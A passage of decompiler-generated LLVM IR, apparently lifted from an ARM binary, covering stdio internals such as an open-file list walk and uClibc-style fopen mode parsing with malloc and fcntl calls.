  %v1_16e8c = phi i32 [ %v0_16e88, %dec_label_pc_16e88 ], [ %v3_16e5c, %dec_label_pc_16e5c ], [ %v1_16e6c.pre, %dec_label_pc_16e74.dec_label_pc_16e68_crit_edge ]
  %v3_16e8c = icmp uge i32 %v0_16e94, %v1_16e8c
  store i1 %v3_16e8c, i1* %cpsr_c.global-to-local, align 1
  %v9_16e8c = icmp eq i32 %v0_16e94, %v1_16e8c
  br i1 %v9_16e8c, label %dec_label_pc_16e94, label %dec_label_pc_16e8c.dec_label_pc_16e5c_crit_edge

dec_label_pc_16e8c.dec_label_pc_16e5c_crit_edge:  ; preds = %dec_label_pc_16e8c
  %v0_16e5c.pre = load i32, i32* @r5, align 4
  %v0_16e64.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16e5c

dec_label_pc_16e94:                               ; preds = %dec_label_pc_16e8c
  %v2_16e94 = icmp ne i32 %v1_16e8c, 0
  store i1 %v2_16e94, i1* %cpsr_c.global-to-local, align 1
  %v7_16e98 = icmp slt i32 %v1_16e8c, 2
  br i1 %v7_16e98, label %dec_label_pc_16eb4, label %dec_label_pc_16e9c

dec_label_pc_16e9c:                               ; preds = %dec_label_pc_16e94
  %v0_16e9c = load i32, i32* @r5, align 4
  %v1_16e9c = add i32 %v0_16e9c, 56
  store i32 %v1_16e9c, i32* %r0.global-to-local, align 4
  %v0_16ea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ea0 = add i32 %v0_16ea0, 129
  store i32 %v1_16ea0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16eb4

dec_label_pc_16eb4:                               ; preds = %dec_label_pc_16e40, %dec_label_pc_16e28, %dec_label_pc_16e9c, %dec_label_pc_16e94
  %v0_16eb4 = load i32, i32* @r5, align 4
  %v1_16eb4 = inttoptr i32 %v0_16eb4 to i16*
  %v2_16eb4 = load i16, i16* %v1_16eb4, align 2
  %v3_16eb4 = zext i16 %v2_16eb4 to i32
  store i32 %v3_16eb4, i32* %r3.global-to-local, align 4
  %v1_16eb8 = and i32 %v3_16eb4, 16384
  %v2_16eb8 = icmp eq i32 %v1_16eb8, 0
  br i1 %v2_16eb8, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_16eb4
  %v2_16ebc = add i32 %v0_16eb4, 8
  %v3_16ebc = inttoptr i32 %v2_16ebc to i32*
  %v4_16ebc = load i32, i32* %v3_16ebc, align 4
  store i32 %v4_16ebc, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_16eb4, %bb48
  %v1_16ec0 = xor i1 %v2_16eb8, true
  call void @__pseudo_cond_branch(i1 %v1_16ec0, i32 ptrtoint (i32* @global_var_14304.33 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16ec8 = load i32, i32* @r8, align 4
  %v2_16ec8 = add i32 %v0_16ec8, 160
  %v3_16ec8 = inttoptr i32 %v2_16ec8 to i32*
  %v4_16ec8 = load i32, i32* %v3_16ec8, align 4
  store i32 %v4_16ec8, i32* @r5, align 4
  %v1_16ecc = add i32 %v4_16ec8, 8
  %v2_16ecc = inttoptr i32 %v1_16ecc to i32*
  %v3_16ecc = load i32, i32* %v2_16ecc, align 4
  store i32 %v3_16ecc, i32* %r3.global-to-local, align 4
  %v1_16ed0 = load i32, i32* %sl.global-to-local, align 4
  %v3_16ed0 = icmp uge i32 %v3_16ecc, %v1_16ed0
  store i1 %v3_16ed0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ed0 = icmp eq i32 %v3_16ecc, %v1_16ed0
  br i1 %v9_16ed0, label %dec_label_pc_16f18, label %dec_label_pc_16ed8

dec_label_pc_16ed8:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16ec8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16ee475 = inttoptr i32 %v4_16ec8 to i32*
  %v2_16ee476 = load i32, i32* %v1_16ee475, align 4
  store i32 %v2_16ee476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16ee878 = icmp eq i32 %v2_16ee476, 0
  br i1 %v9_16ee878, label %dec_label_pc_16ef0, label %dec_label_pc_16f08

dec_label_pc_16ef0:                               ; preds = %dec_label_pc_16ed8, %dec_label_pc_16ef0.dec_label_pc_16ee4_crit_edge
  %v0_16ef079 = phi i32 [ %v1_16ee8.pre, %dec_label_pc_16ef0.dec_label_pc_16ee4_crit_edge ], [ 0, %dec_label_pc_16ed8 ]
  store i32 %v0_16ef079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16f00 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16f00, label %dec_label_pc_16f04, label %dec_label_pc_16ef0.dec_label_pc_16ee4_crit_edge

dec_label_pc_16ef0.dec_label_pc_16ee4_crit_edge:  ; preds = %dec_label_pc_16ef0
  %v0_16ee4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16ee8.pre = load i32, i32* @r4, align 4
  %v1_16ee4 = inttoptr i32 %v0_16ee4.pre to i32*
  %v2_16ee4 = load i32, i32* %v1_16ee4, align 4
  store i32 %v2_16ee4, i32* %r3.global-to-local, align 4
  %v3_16ee8 = icmp uge i32 %v2_16ee4, %v1_16ee8.pre
  store i1 %v3_16ee8, i1* %cpsr_c.global-to-local, align 1
  %v9_16ee8 = icmp eq i32 %v2_16ee4, %v1_16ee8.pre
  br i1 %v9_16ee8, label %dec_label_pc_16ef0, label %dec_label_pc_16f08

dec_label_pc_16f04:                               ; preds = %dec_label_pc_16ef0
  %v0_16f04 = load i32, i32* @r4, align 4
  store i32 %v0_16f04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f08

dec_label_pc_16f08:                               ; preds = %dec_label_pc_16ed8, %dec_label_pc_16ef0.dec_label_pc_16ee4_crit_edge, %dec_label_pc_16f04
  %v0_16f08 = phi i32 [ %v0_16f04, %dec_label_pc_16f04 ], [ %v2_16ee476, %dec_label_pc_16ed8 ], [ %v2_16ee4, %dec_label_pc_16ef0.dec_label_pc_16ee4_crit_edge ]
  %v1_16f08 = phi i32 [ %v0_16f04, %dec_label_pc_16f04 ], [ 0, %dec_label_pc_16ed8 ], [ %v1_16ee8.pre, %dec_label_pc_16ef0.dec_label_pc_16ee4_crit_edge ]
  %v3_16f08 = icmp uge i32 %v0_16f08, %v1_16f08
  store i1 %v3_16f08, i1* %cpsr_c.global-to-local, align 1
  %v9_16f08 = icmp eq i32 %v0_16f08, %v1_16f08
  br i1 %v9_16f08, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_16f08
  %v1_16f0c = load i32, i32* @r5, align 4
  store i32 %v1_16f0c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_16f08, %bb50
  %v1_16f10 = xor i1 %v9_16f08, true
  call void @__pseudo_cond_branch(i1 %v1_16f10, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_16f14 = load i32, i32* %sl.global-to-local, align 4
  %v1_16f14 = load i32, i32* @r5, align 4
  %v2_16f14 = add i32 %v1_16f14, 8
  %v3_16f14 = inttoptr i32 %v2_16f14 to i32*
  store i32 %v0_16f14, i32* %v3_16f14, align 4
  %v0_16f1c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_16f18

dec_label_pc_16f18:                               ; preds = %bb49, %bb51
  %v0_16f1c = phi i32 [ %v0_16ec8, %bb49 ], [ %v0_16f1c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_16f1c = add i32 %v0_16f1c, 80
  %v3_16f1c = inttoptr i32 %v2_16f1c to i32*
  %v4_16f1c = load i32, i32* %v3_16f1c, align 4
  store i32 %v4_16f1c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_16f24 = add i32 %v0_16f1c, 160
  %v3_16f24 = inttoptr i32 %v2_16f24 to i32*
  %v4_16f24 = load i32, i32* %v3_16f24, align 4
  store i32 %v4_16f24, i32* %r0.global-to-local, align 4
  %v1_16f28 = inttoptr i32 %v4_16f1c to i32*
  %v2_16f28 = load i32, i32* %v1_16f28, align 4
  store i32 %v2_16f28, i32* %r3.global-to-local, align 4
  %v1_16f2c = add i32 %v4_16f24, 4
  %v2_16f2c = inttoptr i32 %v1_16f2c to i32*
  %v3_16f2c = load i32, i32* %v2_16f2c, align 4
  store i32 %v3_16f2c, i32* %r1.global-to-local, align 4
  %v1_16f30 = add i32 %v2_16f28, 1
  store i32 %v1_16f30, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16f34 = icmp eq i32 %v3_16f2c, 0
  store i32 %v1_16f30, i32* %v1_16f28, align 4
  br i1 %v2_16f34, label %dec_label_pc_16f40, label %dec_label_pc_16fa0

dec_label_pc_16f40:                               ; preds = %dec_label_pc_16f18
  %v0_16f40 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f40 = load i32, i32* %r0.global-to-local, align 4
  %v2_16f40 = add i32 %v1_16f40, 8
  %v3_16f40 = inttoptr i32 %v2_16f40 to i32*
  store i32 %v0_16f40, i32* %v3_16f40, align 4
  %v0_16f44 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16f44, i32* @r5, align 4
  br label %dec_label_pc_16f48

dec_label_pc_16f48:                               ; preds = %dec_label_pc_16f78.dec_label_pc_16f48_crit_edge, %dec_label_pc_16f40
  %v0_16f48 = phi i32 [ %v0_16f48.pre, %dec_label_pc_16f78.dec_label_pc_16f48_crit_edge ], [ %v0_16f44, %dec_label_pc_16f40 ]
  %v1_16f48 = inttoptr i32 %v0_16f48 to i32*
  %v2_16f48 = load i32, i32* %v1_16f48, align 4
  store i32 %v2_16f48, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16f48, i32* %r2.global-to-local, align 4
  %v2_16f5464 = load i32, i32* %v1_16f48, align 4
  store i32 %v2_16f5464, i32* %r3.global-to-local, align 4
  %v3_16f5866 = icmp uge i32 %v2_16f5464, %v2_16f48
  store i1 %v3_16f5866, i1* %cpsr_c.global-to-local, align 1
  %v9_16f5872 = icmp eq i32 %v2_16f5464, %v2_16f48
  br i1 %v9_16f5872, label %dec_label_pc_16f60, label %dec_label_pc_16f78

dec_label_pc_16f60:                               ; preds = %dec_label_pc_16f48, %dec_label_pc_16f60.dec_label_pc_16f54_crit_edge
  %v0_16f6073 = phi i32 [ %v1_16f58.pre, %dec_label_pc_16f60.dec_label_pc_16f54_crit_edge ], [ %v2_16f48, %dec_label_pc_16f48 ]
  store i32 %v0_16f6073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16f70 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16f70, label %dec_label_pc_16f74, label %dec_label_pc_16f60.dec_label_pc_16f54_crit_edge

dec_label_pc_16f60.dec_label_pc_16f54_crit_edge:  ; preds = %dec_label_pc_16f60
  %v0_16f54.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16f58.pre = load i32, i32* @r4, align 4
  %v1_16f54 = inttoptr i32 %v0_16f54.pre to i32*
  %v2_16f54 = load i32, i32* %v1_16f54, align 4
  store i32 %v2_16f54, i32* %r3.global-to-local, align 4
  %v3_16f58 = icmp uge i32 %v2_16f54, %v1_16f58.pre
  store i1 %v3_16f58, i1* %cpsr_c.global-to-local, align 1
  %v9_16f58 = icmp eq i32 %v2_16f54, %v1_16f58.pre
  br i1 %v9_16f58, label %dec_label_pc_16f60, label %dec_label_pc_16f78

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16f60
  %v0_16f74 = load i32, i32* @r4, align 4
  store i32 %v0_16f74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f78

dec_label_pc_16f78:                               ; preds = %dec_label_pc_16f48, %dec_label_pc_16f60.dec_label_pc_16f54_crit_edge, %dec_label_pc_16f74
  %v0_16f80 = phi i32 [ %v0_16f74, %dec_label_pc_16f74 ], [ %v2_16f5464, %dec_label_pc_16f48 ], [ %v2_16f54, %dec_label_pc_16f60.dec_label_pc_16f54_crit_edge ]
  %v1_16f78 = phi i32 [ %v0_16f74, %dec_label_pc_16f74 ], [ %v2_16f48, %dec_label_pc_16f48 ], [ %v1_16f58.pre, %dec_label_pc_16f60.dec_label_pc_16f54_crit_edge ]
  %v3_16f78 = icmp uge i32 %v0_16f80, %v1_16f78
  store i1 %v3_16f78, i1* %cpsr_c.global-to-local, align 1
  %v9_16f78 = icmp eq i32 %v0_16f80, %v1_16f78
  br i1 %v9_16f78, label %dec_label_pc_16f80, label %dec_label_pc_16f78.dec_label_pc_16f48_crit_edge

dec_label_pc_16f78.dec_label_pc_16f48_crit_edge:  ; preds = %dec_label_pc_16f78
  %v0_16f48.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16f48

dec_label_pc_16f80:                               ; preds = %dec_label_pc_16f78
  %v2_16f80 = icmp ne i32 %v1_16f78, 0
  store i1 %v2_16f80, i1* %cpsr_c.global-to-local, align 1
  %v7_16f84 = icmp slt i32 %v1_16f78, 2
  br i1 %v7_16f84, label %dec_label_pc_16fa0, label %dec_label_pc_16f88

dec_label_pc_16f88:                               ; preds = %dec_label_pc_16f80
  %v0_16f88 = load i32, i32* @r5, align 4
  store i32 %v0_16f88, i32* %r0.global-to-local, align 4
  %v0_16f8c = load i32, i32* %r1.global-to-local, align 4
  %v1_16f8c = add i32 %v0_16f8c, 129
  store i32 %v1_16f8c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16fa0

dec_label_pc_16fa0:                               ; preds = %dec_label_pc_16f18, %dec_label_pc_16f88, %dec_label_pc_16f80
  %v0_16fa0 = call i32 @_stdio_openlist_dec_use()
  %v0_16fa4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_16fa4, i32* %r0.global-to-local, align 4
  %v2_16fac = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16fac, i32* @r4, align 4
  store i32 %v6_16c94, i32* @r5, align 4
  store i32 %v9_16c94, i32* @r6, align 4
  store i32 %v12_16c94, i32* @r7, align 4
  ret i32 %v0_16fa4

; uselistorder directives
  uselistorder i32 %v0_16f74, { 1, 0, 2 }
  uselistorder i32 %v1_16f58.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16f48, { 1, 0 }
  uselistorder i32 %v0_16f1c, { 1, 0 }
  uselistorder i32 %v0_16f04, { 1, 0, 2 }
  uselistorder i32 %v1_16ee8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16ed0, { 1, 0 }
  uselistorder i32 %v0_16e88, { 1, 0, 2 }
  uselistorder i32 %v1_16e6c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16dfc, { 1, 0, 2 }
  uselistorder i32 %v1_16de0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16dd0, { 1, 0 }
  uselistorder i32 %v0_16d8c, { 1, 0, 2 }
  uselistorder i32 %v1_16d70.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16d50, { 1, 0 }
  uselistorder i32 %v1_16cdc.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 12, 11, 1, 13, 16, 14, 15, 17, 19, 18, 46, 20, 21, 22, 23, 24, 26, 25, 43, 27, 28, 29, 30, 32, 31, 44, 33, 34, 35, 36, 37, 38, 39, 41, 40, 45, 42 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 34, 35, 9, 10, 11, 13, 12, 0, 14, 15, 16, 17, 18, 28, 29, 19, 20, 21, 30, 31, 22, 23, 24, 25, 32, 33, 26, 27 }
  uselistorder i32 (i32)* @__GI___libc_close, { 27, 26, 30, 25, 29, 28, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_16fa0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16f78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16f60, { 1, 0 }
  uselistorder label %dec_label_pc_16f18, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_16f08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ef0, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_16eb4, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16e8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16e74, { 1, 0 }
  uselistorder label %dec_label_pc_16e28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16e00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16de8, { 1, 0 }
  uselistorder label %dec_label_pc_16da0, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_16d90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d78, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_16d18, { 1, 0 }
  uselistorder label %dec_label_pc_16d0c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_16cfc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ce4, { 1, 0 }
}

define i32 @function_16fb8(i32 %arg1) local_unnamed_addr {
dec_label_pc_16fb8:
  %v0_16fb8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16fb8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16fb8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16fb8, %bb
  %v10_16fc0 = phi i32 [ %arg1, %dec_label_pc_16fb8 ], [ 0, %bb ]
  ret i32 %v10_16fc0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_16fd4 = call i32 @_stdio_fopen()
  ret i32 %v0_16fd4
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16fe4 = load i32, i32* @r4, align 4
  store i32 %v3_16fe4, i32* %stack_var_-24, align 4
  %v6_16fe4 = load i32, i32* @r5, align 4
  %v9_16fe4 = load i32, i32* @r6, align 4
  %v12_16fe4 = load i32, i32* @r7, align 4
  %v15_16fe4 = load i32, i32* @r8, align 4
  %v0_16fe8 = load i32, i32* @r1, align 4
  %v1_16fe8 = inttoptr i32 %v0_16fe8 to i8*
  %v2_16fe8 = load i8, i8* %v1_16fe8, align 1
  %v2_16ff0 = icmp ugt i8 %v2_16fe8, 113
  store i1 %v2_16ff0, i1* %cpsr_c.global-to-local, align 1
  %v7_16ff0 = icmp eq i8 %v2_16fe8, 114
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r8, align 4
  %v0_16ffc = load i32, i32* @r0, align 4
  store i32 %v0_16ffc, i32* @r7, align 4
  %v0_17000 = load i32, i32* @r2, align 4
  store i32 %v0_17000, i32* @r5, align 4
  %v0_17004 = load i32, i32* @r3, align 4
  store i32 %v0_17004, i32* @r6, align 4
  br i1 %v7_16ff0, label %dec_label_pc_17058, label %dec_label_pc_1700c

dec_label_pc_1700c:                               ; preds = %entry
  %v2_1700c = icmp ugt i8 %v2_16fe8, 118
  store i1 %v2_1700c, i1* %cpsr_c.global-to-local, align 1
  %v7_1700c = icmp eq i8 %v2_16fe8, 119
  br i1 %v7_1700c, label %bb, label %dec_label_pc_17018

bb:                                               ; preds = %dec_label_pc_1700c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_1705c

dec_label_pc_17018:                               ; preds = %dec_label_pc_1700c
  %v2_17018 = icmp ugt i8 %v2_16fe8, 96
  store i1 %v2_17018, i1* %cpsr_c.global-to-local, align 1
  %v7_17018 = icmp eq i8 %v2_16fe8, 97
  br i1 %v7_17018, label %bb50, label %dec_label_pc_17024

bb50:                                             ; preds = %dec_label_pc_17018
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_1705c

dec_label_pc_17024:                               ; preds = %dec_label_pc_17018, %dec_label_pc_170f4, %dec_label_pc_170c8
  store i32 49204, i32* %r2.global-to-local, align 4
  %v0_17028 = call i32 @__aeabi_read_tp()
  store i32 %v0_17028, i32* %r0.global-to-local, align 4
  %v3_1702c = load i16, i16* @global_var_23068.363, align 2
  %v4_1702c = sext i16 %v3_1702c to i32
  store i32 %v4_1702c, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_17034 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17034 = icmp eq i32 %v0_17034, 0
  %v3_17038 = add i32 %v4_1702c, %v0_17028
  %v4_17038 = inttoptr i32 %v3_17038 to i32*
  store i32 22, i32* %v4_17038, align 4
  br i1 %v2_17034, label %dec_label_pc_173fc, label %dec_label_pc_17040

dec_label_pc_17040:                               ; preds = %dec_label_pc_17118._crit_edge, %dec_label_pc_17024
  %v0_17040 = load i32, i32* @r5, align 4
  %v1_17040 = inttoptr i32 %v0_17040 to i16*
  %v2_17040 = load i16, i16* %v1_17040, align 2
  %v3_17040 = zext i16 %v2_17040 to i32
  store i32 %v3_17040, i32* %r3.global-to-local, align 4
  %v1_17044 = and i32 %v3_17040, 8192
  %v2_17044 = icmp eq i32 %v1_17044, 0
  br i1 %v2_17044, label %dec_label_pc_173fc, label %dec_label_pc_1704c

dec_label_pc_1704c:                               ; preds = %dec_label_pc_17040
  store i32 %v0_17040, i32* @r0, align 4
  %v0_17050 = call i32 @free()
  store i32 %v0_17050, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_173fc

dec_label_pc_17058:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1705c

dec_label_pc_1705c:                               ; preds = %bb, %bb50, %dec_label_pc_17058
  %v1_17074 = phi i32 [ 1089, %bb50 ], [ 577, %bb ], [ 1, %dec_label_pc_17058 ]
  %v1_1705c = add i32 %v0_16fe8, 1
  %v2_1705c = inttoptr i32 %v1_1705c to i8*
  %v3_1705c = load i8, i8* %v2_1705c, align 1
  %v2_17060 = icmp ugt i8 %v3_1705c, 97
  store i1 %v2_17060, i1* %cpsr_c.global-to-local, align 1
  %v7_17060 = icmp eq i8 %v3_1705c, 98
  %v1_1705c.v0_16fe8 = select i1 %v7_17060, i32 %v1_1705c, i32 %v0_16fe8
  store i32 %v1_1705c.v0_16fe8, i32* %r3.global-to-local, align 4
  %v1_1706c = add i32 %v1_1705c.v0_16fe8, 1
  %v2_1706c = inttoptr i32 %v1_1706c to i8*
  %v3_1706c = load i8, i8* %v2_1706c, align 1
  %v4_1706c = zext i8 %v3_1706c to i32
  store i32 %v4_1706c, i32* @r3, align 4
  %v2_17070 = icmp ugt i8 %v3_1706c, 42
  store i1 %v2_17070, i1* %cpsr_c.global-to-local, align 1
  %v7_17070 = icmp eq i8 %v3_1706c, 43
  br i1 %v7_17070, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_1705c
  store i32 %v1_17074, i32* @r3, align 4
  %v2_17078 = add nuw nsw i32 %v1_17074, 1
  store i32 %v2_17078, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1705c, %bb53
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1707c = icmp eq i32 %v0_17000, 0
  br i1 %v2_1707c, label %dec_label_pc_17084, label %dec_label_pc_170c0

dec_label_pc_17084:                               ; preds = %.thread4
  store i32 68, i32* @r0, align 4
  %v0_17088 = call i32 @malloc()
  store i32 %v0_17088, i32* %r0.global-to-local, align 4
  store i32 %v0_17088, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1708c = icmp eq i32 %v0_17088, 0
  br i1 %v3_1708c, label %dec_label_pc_17400, label %dec_label_pc_17094

dec_label_pc_17094:                               ; preds = %dec_label_pc_17084
  %v0_17098 = load i32, i32* @r8, align 4
  %v2_17098 = add i32 %v0_17098, -33296
  store i32 %v2_17098, i32* %r3.global-to-local, align 4
  %v1_1709c = inttoptr i32 %v2_17098 to i32*
  %v2_1709c = load i32, i32* %v1_1709c, align 4
  store i32 %v2_1709c, i32* %r0.global-to-local, align 4
  %v3_1709c = add i32 %v0_17098, -33292
  %v4_1709c = inttoptr i32 %v3_1709c to i32*
  %v5_1709c = load i32, i32* %v4_1709c, align 4
  store i32 %v5_1709c, i32* @r1, align 4
  %v6_1709c = add i32 %v0_17098, -33288
  %v7_1709c = inttoptr i32 %v6_1709c to i32*
  %v8_1709c = load i32, i32* %v7_1709c, align 4
  store i32 %v8_1709c, i32* %r2.global-to-local, align 4
  %v2_170a8 = add i32 %v0_17088, 8
  %v3_170a8 = inttoptr i32 %v2_170a8 to i32*
  store i32 0, i32* %v3_170a8, align 4
  %v2_170b0 = load i32, i32* @r5, align 4
  %v3_170b0 = inttoptr i32 %v2_170b0 to i16*
  store i16 8192, i16* %v3_170b0, align 2
  %v2_170b4 = load i32, i32* %r0.global-to-local, align 4
  %v0_170b8 = load i32, i32* @r5, align 4
  %v1_170b8 = add i32 %v0_170b8, 56
  store i32 %v1_170b8, i32* @r3, align 4
  %v1_170bc = inttoptr i32 %v1_170b8 to i32*
  store i32 %v2_170b4, i32* %v1_170bc, align 4
  %v3_170bc = add i32 %v0_170b8, 60
  %v4_170bc = inttoptr i32 %v3_170bc to i32*
  %v5_170bc = load i32, i32* @r1, align 4
  store i32 %v5_170bc, i32* %v4_170bc, align 4
  %v6_170bc = add i32 %v0_170b8, 64
  %v7_170bc = inttoptr i32 %v6_170bc to i32*
  %v8_170bc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_170bc, i32* %v7_170bc, align 4
  %v0_170c0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_170c0

dec_label_pc_170c0:                               ; preds = %.thread4, %dec_label_pc_17094
  %v0_17118 = phi i32 [ %v0_17004, %.thread4 ], [ %v0_170c0.pre, %dec_label_pc_17094 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_170c0 = icmp slt i32 %v0_17118, 0
  br i1 %v1_170c0, label %dec_label_pc_17118, label %dec_label_pc_170c8

dec_label_pc_170c8:                               ; preds = %dec_label_pc_170c0
  %v0_170cc = load i32, i32* @r4, align 4
  %v2_170cc = and i32 %v0_170cc, 131075
  %v1_170d0 = add nuw nsw i32 %v2_170cc, 1
  store i32 %v1_170d0, i32* %r2.global-to-local, align 4
  %v0_170d4 = load i32, i32* @r7, align 4
  %v1_170d4 = add i32 %v0_170d4, 1
  %v2_170d8 = and i32 %v1_170d4, %v1_170d0
  store i32 %v2_170d8, i32* %r3.global-to-local, align 4
  %v3_170dc = icmp uge i32 %v2_170d8, %v1_170d0
  store i1 %v3_170dc, i1* %cpsr_c.global-to-local, align 1
  %v9_170dc = icmp eq i32 %v2_170d8, %v1_170d0
  %v1_170e0 = load i32, i32* @r5, align 4
  %v2_170e0 = add i32 %v1_170e0, 4
  %v3_170e0 = inttoptr i32 %v2_170e0 to i32*
  store i32 %v0_17118, i32* %v3_170e0, align 4
  br i1 %v9_170dc, label %dec_label_pc_170e8, label %dec_label_pc_17024

dec_label_pc_170e8:                               ; preds = %dec_label_pc_170c8
  %v0_170e8 = load i32, i32* @r4, align 4
  %v1_170e8 = load i32, i32* @r7, align 4
  %v2_170e8 = sub i32 -1, %v1_170e8
  %v3_170e8 = and i32 %v0_170e8, %v2_170e8
  store i32 %v3_170e8, i32* @r3, align 4
  %v1_170ec = and i32 %v3_170e8, 1024
  %v2_170ec = icmp eq i32 %v1_170ec, 0
  br i1 %v2_170ec, label %dec_label_pc_1710c, label %dec_label_pc_170f4

dec_label_pc_170f4:                               ; preds = %dec_label_pc_170e8
  %v0_170f4 = load i32, i32* @r6, align 4
  store i32 %v0_170f4, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_17100 = call i32 @__libc_fcntl(i32 %v0_170f4, i32 4)
  store i32 %v2_17100, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17104 = icmp eq i32 %v2_17100, 0
  br i1 %v2_17104, label %dec_label_pc_170f4.dec_label_pc_1710c_crit_edge, label %dec_label_pc_17024

dec_label_pc_170f4.dec_label_pc_1710c_crit_edge:  ; preds = %dec_label_pc_170f4
  %v0_1710c.pre = load i32, i32* @r7, align 4
  %v0_17110.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1710c

dec_label_pc_1710c:                               ; preds = %dec_label_pc_170f4.dec_label_pc_1710c_crit_edge, %dec_label_pc_170e8
